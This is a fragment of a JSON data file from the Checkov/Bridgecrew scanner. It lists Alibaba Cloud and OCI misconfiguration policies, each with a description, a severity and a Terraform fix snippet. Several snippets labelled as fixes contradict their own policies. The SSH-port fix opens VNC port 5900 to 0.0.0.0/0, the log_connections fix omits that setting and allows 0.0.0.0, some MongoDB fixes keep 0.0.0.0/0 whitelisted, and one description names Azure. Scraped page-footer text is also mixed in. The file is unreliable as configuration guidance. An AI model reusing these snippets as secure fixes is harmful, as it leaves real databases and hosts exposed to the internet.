        "description": "Alibaba Cloud RAM password policy maximal login attempts is more than 4.\nDescription\nBy default, the maximal login attempts for a RAM account is set to 5. This means that an unauthorized user can make up to 5 failed login attempts before the account is locked. If the maximal login attempts is set to a lower value, such as 3 or 2, it will take fewer failed login attempts to lock the account. This can help to reduce the risk of unauthorized access to the account, as it makes it more difficult for an attacker to guess the correct login credentials.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 9\n  require_lowercase_characters = false\n  require_uppercase_characters = false\n  require_numbers              = false\n  require_symbols              = false\n  hard_expiry                  = true\n  max_password_age             = 12\n  password_reuse_prevention    = 5\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-versioning-enabled",
        "description": "Alibaba Cloud OSS bucket has versioning disabled\nDescription\nEnabling versioning for an Alibaba Cloud OSS bucket can help to protect your data and provide a way to recover from accidental deletions or overwrites. When versioning is enabled, OSS automatically archives all versions of an object (including all writes and deletes) in the bucket. This allows you to recover previous versions of an object or restore an accidentally deleted object.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_oss_bucket\" \"pass\" {\n  bucket = \"bucket-123-versioning\"\n  acl    = \"private\"\n\n  versioning {\n    status = \"Enabled\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-action-trail-logging-for-all-events",
        "description": "Alibaba Cloud Action Trail Logging is not enabled for all events\nDescription\nBy enabling Action Trail logging for all events, you can track and monitor all activity in your Alibaba Cloud account, including all API calls and account activity. This can help to identify potential security issues or unauthorized access, and can also be useful for auditing purposes.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_actiontrail_trail\" \"pass\" {\n  trail_name         = \"action-trail\"\n  oss_write_role_arn = \"acs:ram::1182725xxxxxxxxxxx\"\n  oss_bucket_name    = \"bucket_name\"\n  event_rw           = \"All\"\n  trail_region       = \"All\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_20": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-uses-ssl",
        "description": "Alibaba Cloud RDS instance does not use SSL\nDescription\nSSL helps protect your data from unauthorized access or tampering by encrypting the data as it is transmitted between the RDS instance instance and the client. By enabling SSL, you can help ensure that only authorized users with the correct keys can access and decrypt the data, and that the data is protected while in transit.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  engine              = \"MySQL\"\n  engine_version      = \"5.6\"\n  ssl_action          = \"Open\"\n  instance_storage    = \"30\"\n  instance_type       = \"mysql.n2.small.25\"\n  parameters = [{\n    name  = \"innodb_large_prefix\"\n    value = \"ON\"\n    }, {\n    name  = \"connect_timeout\"\n    value = \"50\"\n  }]\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-is-not-accessible-to-public",
        "description": "Alibaba Cloud OSS bucket is public\nDescription\nThis policy identifies Object Storage Service (OSS) buckets which are publicly accessible. Alibaba Cloud OSS allows customers to store and retrieve any type of content from anywhere on the web. Often, customers have legitimate reasons to expose the OSS bucket to the public, for example, to host website content. However, these buckets often contain highly sensitive enterprise data which if left open to the public may result in sensitive data leaks.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Object Storage Service\nIn the left-side navigation pane, click on the reported bucket\nIn the 'Basic Settings' tab, In the 'Access Control List (ACL)' Section, Click on 'Configure'\nFor 'Bucket ACL' field, Choose 'Private' option\nClick on 'Save'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_oss_bucket\" \"good-bucket\" {\n  bucket = \"bucket-1732-acl\"\n  acl    = \"private\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-no-alibaba-cloud-security-groups-allow-ingress-from-00000-to-port-22",
        "description": "Alibaba Cloud Security group allows internet traffic to SSH port (22)\nDescription\nThis policy identifies Security groups that allow inbound traffic on SSH port (22) from the public internet. As a best practice, restrict security groups to only allow permitted traffic and limit brute force attacks on your network.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Elastic Compute Service\nIn the left-side navigation pane, choose Network & Security > Security Groups\nSelect the reported security group and then click Add Rules in the Actions column\nIn Inbound tab, Select the rule having 'Action' as Allow, 'Authorization Object' as 0.0.0.0/0 and 'Port Range' value as 22, Click Modify in the Actions column\nReplace the value 0.0.0.0/0 with specific IP address range.\nClick on 'OK'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_security_group_rule\" \"allow_all_vncserver\" {\n  type              = \"ingress\"\n  ip_protocol       = \"tcp\"\n  nic_type          = \"internet\"\n  policy            = \"accept\"\n  port_range        = \"5900/5900\"\n  security_group_id = alicloud_security_group.default.id\n  cidr_ip           = \"0.0.0.0/0\"\n}\nFooter\n\u00a9 2022 GitHub, Inc.\nFooter navigation\n",
        "severity": "HIGH"
    },
    "CKV_ALI_15": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-password-policy-requires-at-least-one-symbol",
        "description": "Alibaba Cloud RAM password policy does not have a symbol\nDescription\nThis policy identifies Alibaba Cloud accounts that do not have a symbol in the password policy. As a security best practice, configure a strong password policy for secure access to the Alibaba Cloud console.\nFix - Runtime\nAlibaba Cloud Portal\n\nLog in to Alibaba Cloud Portal\nGo to Resource Access Management (RAM) service\nIn the left-side navigation pane, click on 'Settings'\nIn the 'Security Settings' tab, In the 'Password Strength Settings' Section, Click on 'Edit Password Rule'\nIn the 'Required Elements in Password' field, select 'Symbols'\nClick on 'OK'\nClick on 'Close'\n\nFix - Buildtime \nTerraform\nGoresource \"alicloud_ram_account_password_policy\" \"pass\" {\n  minimum_password_length      = 14\n  require_lowercase_characters = false\n  require_uppercase_characters = false\n  require_numbers              = false\n  require_symbols              = true\n  hard_expiry                  = true\n  max_password_age             = 14\n  password_reuse_prevention    = 5\n  max_login_attempts           = 3\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_ALI_12": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-oss-bucket-has-access-logging-enabled",
        "description": "Alibaba Cloud OSS bucket has access logging enabled\nDescription\nEnabling access logging for an Alibaba Cloud OSS (Object Storage Service) bucket can help to improve the security and management of the bucket. Access logging records information about each request made to the bucket, including the request type, the source IP address, the object accessed, and the response status.\nBy enabling access logging, you can track and monitor access to the bucket, which can help to identify potential security issues or unauthorized access. Access logging can also be useful for auditing purposes, as it provides a record of all requests made to the bucket.\nFix - Buildtime \nTerraform\nGoresource \"alicloud_oss_bucket\" \"pass\" {\n  bucket = \"bucket-170309-logging\"\n\n  logging {\n    target_bucket = alicloud_oss_bucket.bucket-target.id\n    target_prefix = \"log/\"\n  }\n}\nFooter\n",
        "severity": "LOW"
    },
    "CKV_ALI_37": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled",
        "description": "Alibaba RDS instance has log_connections disabled\nDescription\nRDS does not log attempted connections by default. Enabling the log_connections setting creates log entries for each attempted connection to the server, along with the successful completion of client authentication. This information can be useful in troubleshooting issues and determining any unusual connection attempts to the server.\nWe recommend you set the log_connections database flag for Alibaba Cloud RDS instances to on.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  engine           = \"MySQL\"\n  engine_version   = \"5.6\"\n  instance_type    = \"rds.mysql.t1.small\"\n  instance_storage = \"10\"\n  tde_status       = \"Disabled\"\n  auto_upgrade_minor_version = \"Manual\"\n  # ssl_action=\"Closed\"\n  security_ips = [\n    \"0.0.0.0\",\n    \"10.23.12.24/24\"\n  ]\n  parameters {\n        name = \"log_duration\"\n        value = \"ON\"\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_31": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kubernetes-node-pools-are-set-to-auto-repair",
        "description": "Alibaba Cloud Kubernetes node pools are not set to auto repair\nDescription\nBy enabling auto repair for Alibaba Cloud Kubernetes node pools, you can help ensure that your node pool is highly available and can automatically recover from failures or disruptions. If a node in the pool fails or becomes unavailable, auto repair can automatically replace the node to restore full functionality to the pool.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_cs_kubernetes_node_pool\" \"pass\" {\n  name           = var.name\n  cluster_id     = alicloud_cs_managed_kubernetes.default.0.id\n  vswitch_ids    = [alicloud_vswitch.default.id]\n  instance_types = [data.alicloud_instance_types.default.instance_types.0.id]\n\n  system_disk_category = \"cloud_efficiency\"\n  system_disk_size     = 40\n  key_name             = alicloud_key_pair.default.key_name\n\n  # comment out node_count and specify a new field desired_size\n  # node_count = 1\n\n  desired_size = 1\n\n  management {\n    auto_repair     = true\n    auto_upgrade    = false #default\n    surge           = 1\n    max_unavailable = 1\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_29": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-alb-acl-restricts-public-access",
        "description": "Alibaba cloud ALB ACL does not restrict public access\nDescription\nDisabling the public network access properly improves security by ensuring your Azure Database for Alibaba cloud ALB ACL configuration can only be accessed from a private endpoint. \nFix - Runtime\nFix - Buildtime\nGoresource \"alicloud_alb_acl_entry_attachment\" \"phew\" {\n  acl_id      = alicloud_alb_acl.fail.id\n  entry       = \"10.0.0.0/16\"\n  description = var.name\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_42": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-uses-ssl",
        "description": "Alibaba Cloud MongoDB instance does not use SSL\nDescription\nSSL helps protect your data from unauthorized access or tampering by encrypting the data as it is transmitted between the MongoDB instance and the client. By enabling SSL, you can help ensure that only authorized users with the correct keys can access and decrypt the data, and that the data is protected while in transit.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_mongodb_instance\" \"pass2\" {\n  engine_version      = \"3.4\"\n  db_instance_class   = \"dds.mongo.mid\"\n  db_instance_storage = 10\n  vswitch_id          = alicloud_vswitch.ditch.id\n  security_ip_list    = [\"0.0.0.0/0\",\"10.168.1.12\", \"100.69.7.112\"]\n  kms_encryption_context= {\n\n  }\n  # tde_status = \"Disabled\"\n  ssl_action = \"Update\"\n  # not set\n  network_type = \"VPC\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_35": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-rds-instance-has-log_connections-enabled",
        "description": "Alibaba RDS instance has log_connections disabled\nDescription\nRDS does not log attempted connections by default. Enabling the log_connections setting creates log entries for each attempted connection to the server, along with the successful completion of client authentication. This information can be useful in troubleshooting issues and determining any unusual connection attempts to the server.\nWe recommend you set the log_connections database flag for Alibaba Cloud RDS instances to on.\nFix - Buildtime\nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  engine           = \"MySQL\"\n  engine_version   = \"5.6\"\n  instance_type    = \"rds.mysql.t1.small\"\n  instance_storage = \"10\"\n  tde_status       = \"Disabled\"\n  auto_upgrade_minor_version = \"Manual\"\n  # ssl_action=\"Closed\"\n  security_ips = [\n    \"0.0.0.0\",\n    \"10.23.12.24/24\"\n  ]\n  parameters {\n        name = \"log_duration\"\n        value = \"ON\"\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_43": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-instance-is-not-public",
        "description": "Alibaba Cloud MongoDB instance is public\nDescription\nFix - Runtime\nDisabling the public network access properly improves security by ensuring your Alibaba Cloud MongoDB instances can only be accessed from a private endpoint. \nFix - Buildtime\nTerraform\nGoresource \"alicloud_mongodb_instance\" \"pass2\" {\n  engine_version      = \"3.4\"\n  db_instance_class   = \"dds.mongo.mid\"\n  db_instance_storage = 10\n  vswitch_id          = alicloud_vswitch.ditch.id\n  security_ip_list    = [\"10.168.1.12\", \"100.69.7.112\"]\n  kms_encryption_context= {\n\n  }\n  # tde_status = \"Disabled\"\n  ssl_action = \"Update\"\n  # not set\n  network_type = \"VPC\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_32": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-launch-template-data-disks-are-encrypted",
        "description": "Alibaba Cloud launch template data disks are not encrypted\nDescription\nAs a best practice enable encryption for your Alibaba Cloud launch template data disks to improve data security without making changes to your business or applications. \nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_ecs_launch_template\" \"pass\" {\n  launch_template_name          = \"tf_test_name\"\n  description                   = \"Test For Terraform\"\n  image_id                      = \"m-bp1i3ucxxxxx\"\n  host_name                     = \"host_name\"\n  instance_charge_type          = \"PrePaid\"\n  instance_name                 = \"instance_name\"\n  instance_type                 = \"ecs.instance_type\"\n  internet_charge_type          = \"PayByBandwidth\"\n  internet_max_bandwidth_in     = \"5\"\n  internet_max_bandwidth_out    = \"0\"\n  io_optimized                  = \"optimized\"\n  key_pair_name                 = \"key_pair_name\"\n  ram_role_name                 = \"ram_role_name\"\n  network_type                  = \"vpc\"\n  security_enhancement_strategy = \"Active\"\n  spot_price_limit              = \"5\"\n  spot_strategy                 = \"SpotWithPriceLimit\"\n  security_group_ids            = [\"sg-zkdfjaxxxxxx\"]\n  system_disk {\n    category             = \"cloud_ssd\"\n    description          = \"Test For Terraform\"\n    name                 = \"tf_test_name\"\n    size                 = \"40\"\n    delete_with_instance = \"false\"\n  }\n\n  resource_group_id = \"rg-zkdfjaxxxxxx\"\n  user_data         = \"xxxxxxx\"\n  vswitch_id        = \"vw-zwxscaxxxxxx\"\n  vpc_id            = \"vpc-asdfnbgxxxxxxx\"\n  zone_id           = \"cn-hangzhou-i\"\n\n  template_tags = {\n    Create = \"Terraform\"\n    For    = \"Test\"\n  }\n\n  network_interfaces {\n    name              = \"eth0\"\n    description       = \"hello1\"\n    primary_ip        = \"10.0.0.2\"\n    security_group_id = \"sg-asdfnbgxxxxxxx\"\n    vswitch_id        = \"vw-zkdfjaxxxxxx\"\n  }\n\n  data_disks {\n    name                 = \"disk1\"\n    description          = \"test1\"\n    delete_with_instance = \"true\"\n    category             = \"cloud\"\n    encrypted            = true\n    performance_level    = \"PL0\"\n    size                 = \"20\"\n  }\n\n  data_disks {\n    name                 = \"disk2\"\n    description          = \"test2\"\n    delete_with_instance = \"true\"\n    category             = \"cloud\"\n    encrypted            = true\n    performance_level    = \"PL0\"\n    size                 = \"20\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_36": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled-1",
        "description": "Alibaba Cloud RDS instance does not have log_disconnections enabled\nDescription\nEnabling the log_disconnections database flag logs at the end of each session, including the session duration. RDS does not log session details by default, including duration and session end details. Enabling the log_disconnections database flag creates log entries at the end of each session, which is useful when troubleshooting issues and determining unusual activity across a period.\nWe recommended you set the log_disconnections flag for a PostgreSQL instance to On.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_db_instance\" \"pass2\" {\n  engine           = \"MySQL\"\n  engine_version   = \"5.6\"\n  instance_type    = \"rds.mysql.t1.small\"\n  instance_storage = \"10\"\n  tde_status       = \"Disabled\"\n  auto_upgrade_minor_version = \"Manual\"\n  # ssl_action=\"Closed\"\n  security_ips = [\n    \"0.0.0.0\",\n    \"10.23.12.24/24\"\n  ]\n  parameters {\n        name = \"log_duration\"\n        value = \"on\"\n    }\n\n    parameters {\n        name = \"log_disconnections\"\n        value = \"on\"\n    }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_28": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-has-log_disconnections-enabled",
        "description": "Alibaba Cloud KMS Key is disabled\nDescription\nEnabling your KMS key helps protect your data from unauthorized access or tampering by encrypting the data and requiring users to provide the correct key in order to decrypt and access the data. By enabling your KMS key, you can help ensure that only authorized users with the correct credentials can access your data.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_kms_key\" \"pass\" {\n  description             = \"Hello KMS\"\n  pending_window_in_days  = \"7\"\n  status                  = \"Enabled\"\n  automatic_rotation      = \"Enabled\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_30": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-instance-is-set-to-perform-auto-upgrades-for-minor-versions",
        "description": "Alibaba Cloud RDS instance is not set to perform auto upgrades for minor versions\nDescription\nAuto upgrades for minor versions help ensure that your RDS instance is running the latest version, which can include security updates and patches. By enabling auto upgrades, you can help protect your RDS instance and the data it contains from vulnerabilities and threats.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_db_instance\" \"pass\" {\n  auto_upgrade_minor_version = \"Auto\"\n  engine               = \"MySQL\"\n  engine_version       = \"5.6\"\n  instance_type        = \"rds.mysql.s2.large\"\n  instance_storage     = \"30\"\n  instance_charge_type = \"Postpaid\"\n  instance_name        = \"myfirstdb\"\n  vswitch_id           = alicloud_vswitch.ditch.id\n  monitoring_period    = \"60\"\n  ssl_action           = \"Close\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_41": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-is-deployed-inside-a-vpc",
        "description": "Alibaba Cloud MongoDB is not deployed inside a VPC\nDescription\nDeploying your MongoDB database inside a VPC helps protect your data from unauthorized access or tampering by isolating the database from the public internet. By deploying your database inside a VPC, you can help ensure that only authorized users with the correct permissions can access the data, and that the data is protected from external threats such as hackers or malware.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_mongodb_instance\" \"pass\" {\n  engine_version      = \"3.4\"\n  db_instance_class   = \"dds.mongo.mid\"\n  db_instance_storage = 10\n  vswitch_id          = alicloud_vswitch.ditch.id\n  security_ip_list    = [\"0.0.0.0/0\",\"10.168.1.12\", \"100.69.7.112\"]\n  kms_encryption_context= {\n\n  }\n  # tde_status = \"Disabled\"\n  ssl_action = \"Close\"\n  # not set\n  network_type = \"VPC\"\n}\n\nresource \"alicloud_vswitch\" \"ditch\" {\n  vpc_id     = \"anyoldtripe\"\n  cidr_block = \"0.0.0.0/0\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_27": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-kms-key-rotation-is-enabled",
        "description": "Alibaba Cloud KMS Key Rotation is disabled\nDescription\nA key is a named object representing a cryptographic key used for a specific purpose, including data protection. The key material, the actual bits used for encryption, can change over time as new key versions are created. A collection of files could be encrypted with the same key and people with decrypt permissions on that key would be able to decrypt those files.\nWe recommend you set a key rotation period. A key can be created with a specified rotation period, which is the time when new key versions are generated automatically. A key can also be created with a specified next rotation time.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_kms_key\" \"pass\" {\n  description             = \"Hello KMS\"\n  pending_window_in_days  = \"7\"\n  status                  = \"Enabled\"\n  automatic_rotation      = \"Enabled\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_38": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-log-audit-is-enabled",
        "description": "Alibaba Cloud RDS log audit is disabled\nDescription\nIt is recommended to have a proper logging process for Alibaba Cloud RDS in order to detect anomalous configuration activity It is used to track configuration changes conducted manually and programmatically and trace back unapproved changes.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_log_audit\" \"pass\" {\n  display_name = \"tf-audit-test\"\n  aliuid       = \"12345678\"\n  variable_map = {\n    \"actiontrail_enabled\"             = \"true\",\n    \"actiontrail_ttl\"                 = \"180\",\n    \"actiontrail_ti_enabled\"          = \"true\",\n    \"oss_access_enabled\"              = \"true\",\n    \"oss_access_ttl\"                  = \"7\",\n    \"oss_sync_enabled\"                = \"true\",\n    \"oss_sync_ttl\"                    = \"180\",\n    \"oss_access_ti_enabled\"           = \"true\",\n    \"oss_metering_enabled\"            = \"true\",\n    \"oss_metering_ttl\"                = \"180\",\n    \"rds_enabled\"                     = \"true\",\n    \"rds_audit_collection_policy\"     = \"\",\n    \"rds_ttl\"                         = \"180\",\n    \"rds_ti_enabled\"                  = \"true\",\n    \"rds_slow_enabled\"                = \"true\",\n    \"rds_slow_collection_policy\"      = \"\",\n    \"rds_slow_ttl\"                    = \"180\",\n    \"rds_perf_enabled\"                = \"true\",\n    \"rds_perf_collection_policy\"      = \"\",\n    \"rds_perf_ttl\"                    = \"180\",\n    \"vpc_flow_enabled\"                = \"true\",\n    \"vpc_flow_ttl\"                    = \"7\",\n    \"vpc_flow_collection_policy\"      = \"\",\n    \"vpc_sync_enabled\"                = \"true\",\n    \"vpc_sync_ttl\"                    = \"180\",\n    \"polardb_enabled\"                 = \"true\",\n    \"polardb_audit_collection_policy\" = \"\",\n    \"polardb_ttl\"                     = \"180\",\n    \"polardb_ti_enabled\"              = \"true\",\n    \"polardb_slow_enabled\"            = \"true\",\n    \"polardb_slow_collection_policy\"  = \"\",\n    \"polardb_slow_ttl\"                = \"180\",\n    \"polardb_perf_enabled\"            = \"true\",\n    \"polardb_perf_collection_policy\"  = \"\",\n    \"polardb_perf_ttl\"                = \"180\",\n    \"drds_audit_enabled\"              = \"true\",\n    \"drds_audit_collection_policy\"    = \"\",\n    \"drds_audit_ttl\"                  = \"7\",\n    \"drds_sync_enabled\"               = \"true\",\n    \"drds_sync_ttl\"                   = \"180\",\n    \"drds_audit_ti_enabled\"           = \"true\",\n    \"slb_access_enabled\"              = \"true\",\n    \"slb_access_collection_policy\"    = \"\",\n    \"slb_access_ttl\"                  = \"7\",\n    \"slb_sync_enabled\"                = \"true\",\n    \"slb_sync_ttl\"                    = \"180\",\n    \"slb_access_ti_enabled\"           = \"true\",\n    \"bastion_enabled\"                 = \"true\",\n    \"bastion_ttl\"                     = \"180\",\n    \"bastion_ti_enabled\"              = \"true\",\n    \"waf_enabled\"                     = \"true\",\n    \"waf_ttl\"                         = \"180\",\n    \"waf_ti_enabled\"                  = \"true\",\n    \"cloudfirewall_enabled\"           = \"true\",\n    \"cloudfirewall_ttl\"               = \"180\",\n    \"cloudfirewall_ti_enabled\"        = \"true\",\n    \"ddos_coo_access_enabled\"         = \"true\",\n    \"ddos_coo_access_ttl\"             = \"180\",\n    \"ddos_coo_access_ti_enabled\"      = \"true\",\n    \"ddos_bgp_access_enabled\"         = \"true\",\n    \"ddos_bgp_access_ttl\"             = \"180\",\n    \"ddos_dip_access_enabled\"         = \"true\",\n    \"ddos_dip_access_ttl\"             = \"180\",\n    \"ddos_dip_access_ti_enabled\"      = \"true\",\n    \"sas_crack_enabled\"               = \"true\",\n    \"sas_dns_enabled\"                 = \"true\",\n    \"sas_http_enabled\"                = \"true\",\n    \"sas_local_dns_enabled\"           = \"true\",\n    \"sas_login_enabled\"               = \"true\",\n    \"sas_network_enabled\"             = \"true\",\n    \"sas_process_enabled\"             = \"true\",\n    \"sas_security_alert_enabled\"      = \"true\",\n    \"sas_security_hc_enabled\"         = \"true\",\n    \"sas_security_vul_enabled\"        = \"true\",\n    \"sas_session_enabled\"             = \"true\",\n    \"sas_snapshot_account_enabled\"    = \"true\",\n    \"sas_snapshot_port_enabled\"       = \"true\",\n    \"sas_snapshot_process_enabled\"    = \"true\",\n    \"sas_ttl\"                         = \"180\",\n    \"sas_ti_enabled\"                  = \"true\",\n    \"apigateway_enabled\"              = \"true\",\n    \"apigateway_ttl\"                  = \"180\",\n    \"apigateway_ti_enabled\"           = \"true\",\n    \"nas_enabled\"                     = \"true\",\n    \"nas_ttl\"                         = \"180\",\n    \"nas_ti_enabled\"                  = \"true\",\n    \"appconnect_enabled\"              = \"true\",\n    \"appconnect_ttl\"                  = \"180\",\n    \"cps_enabled\"                     = \"true\",\n    \"cps_ttl\"                         = \"180\",\n    \"cps_ti_enabled\"                  = \"true\",\n    \"k8s_audit_enabled\"               = \"true\",\n    \"k8s_audit_collection_policy\"     = \"\",\n    \"k8s_audit_ttl\"                   = \"180\",\n    \"k8s_event_enabled\"               = \"true\",\n    \"k8s_event_collection_policy\"     = \"\",\n    \"k8s_event_ttl\"                   = \"180\",\n    \"k8s_ingress_enabled\"             = \"true\",\n    \"k8s_ingress_collection_policy\"   = \"\",\n    \"k8s_ingress_ttl\"                 = \"180\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_24": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-enforces-mfa",
        "description": "Alibaba Cloud RAM does not enforce MFA\nDescription\nEnforcing MFA helps protect your data from unauthorized access or tampering by requiring users to provide additional verification before accessing resources. By enabling MFA, you can help ensure that only authorized users with the correct credentials can access your resources.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_ram_security_preference\" \"pass\" {\n  enable_save_mfa_ticket        = false\n  allow_user_to_change_password = true\n  enforce_mfa_for_login         = true\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_44": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-mongodb-has-transparent-data-encryption-enabled",
        "description": "Alibaba Cloud MongoDB does not have transparent data encryption enabled\nDescription\nTransparent data encryption for your Alibaba Cloud MongoDB helps protect your data from unauthorized access or tampering by encrypting the data as it is written to disk and decrypting it when it is accessed. By enabling transparent data encryption, you can help ensure that only authorized users with the correct keys can access and decrypt the data, and that the data is protected while in storage.\nFix - Runtime\nFix - Buildtime\nTerraform\nGoresource \"alicloud_mongodb_instance\" \"pass\" {\n  engine_version      = \"3.4\"\n  db_instance_class   = \"dds.mongo.mid\"\n  db_instance_storage = 10\n  vswitch_id          = alicloud_vswitch.ditch.id\n  security_ip_list    = [\"10.168.1.12\", \"100.69.7.112\"]\n  kms_encryption_context= {\n\n  }\n  # tde_status = \"Disabled\"\n  ssl_action = \"Update\"\n  # not set\n  network_type = \"VPC\"\n  tde_status = \"enabled\"\n}\n",
        "severity": "LOW"
    },
    "CKV_ALI_33": {
        "url": "https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-cypher-policy-is-secured",
        "description": "Alibaba Cloud Cypher Policy is not secured\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) as part of Alibaba Cloud Cypher policy configuration.\nFix - Buildtime\nGoresource \"alicloud_slb_tls_cipher_policy\" \"pass\" {\n  tls_cipher_policy_name = \"itsfine\"\n  tls_versions           = [\"TLSv1.2\"]\n  ciphers                = [\"AES256-SHA\",\"AES256-SHA256\", \"AES128-GCM-SHA256\"]\n}\n",
        "severity": "LOW"
    },
    "CKV_OCI_18": {
        "url": "https://docs.bridgecrew.io/docs/oci-iam-password-policy-for-local-non-federated-users-has-a-minimum-length-of-14-characters",
        "description": "OCI IAM password policy for local (non-federated) users does not have minimum 14 characters\nDescription\nThis policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a minimum of 14 characters in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console Page: https://console.ap-mumbai-1.oraclecloud.com/\nGo to Identity in the Services menu.\nSelect Authentication Settings from the Identity menu.\nClick Edit Authentication Settings in the middle of the page.\nType the number in range 14-100 into the box below the text: MINIMUM PASSWORD LENGTH (IN CHARACTERS).\n\nNote : The console URL is region specific, your tenancy might have a different home region and thus console URL.\nFix - Buildtime\nTerraform\n\nResource: oci_identity_authentication_policy\nArguments: password_policy.minimum_password_length \n\nGoresource \"oci_identity_authentication_policy\" \"pass\" {\n\n  compartment_id = var.tenancy_id\n\n  password_policy {\n...\n    minimum_password_length          = 14\n  }\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_1": {
        "url": "https://docs.bridgecrew.io/docs/bc_oci_secrets_1",
        "description": "OCI private keys are hard coded in the provider\nDescription\nWhen accessing OCI programmatically, users can use a password protected certificate. Including that password in your files that are checked into a repository leaves you exposed to account hijacking.\nWe recommend using a secrets store or security tokens for secure access.\nFix - Buildtime\nTerraform\nGoprovider \"oci\" {\n-  private_key_password = \"secretPassword\"  \n}\n",
        "severity": "CRITICAL"
    },
    "CKV_OCI_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-block-storage-block-volume-has-backup-enabled",
        "description": "OCI Block Storage Block Volume has backup is disabled\nDescription\nThis policy identifies the OCI Block Storage Volumes that are do not have backup enabled. It is recommended to have block volume backup policies on each block volume that the block volume can be restored during data loss events.\nFix - Runtime\nOCI Console\n\nLogin to the OCI Console\nType the resource reported in the alert into the Search box at the top of the Console.\nClick the resource reported in the alert from the Resources submenu\nClick on Edit button\nSelect the Backup Policy from the Backup Policies section as appropriate\nClick Save Changes\n\nFix - Buildtime\nTerraform\n\nResource: oci_core_volum\nArguments: backup_policy_id \n\nGoresource \"oci_core_volume\" \"pass\" {\n  #Required\n  compartment_id = var.compartment_id\n\n  #Optional\n  availability_domain = var.volume_availability_domain\n  backup_policy_id    = data.oci_core_volume_backup_policies.test_volume_backup_policies.volume_backup_policies.0.id\n  block_volume_replicas {\n    #Required\n    availability_domain = var.volume_block_volume_replicas_availability_domain\n\n....\n}\n",
        "severity": "HIGH"
    },
    "CKV_OCI_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-monitoring-enabled",
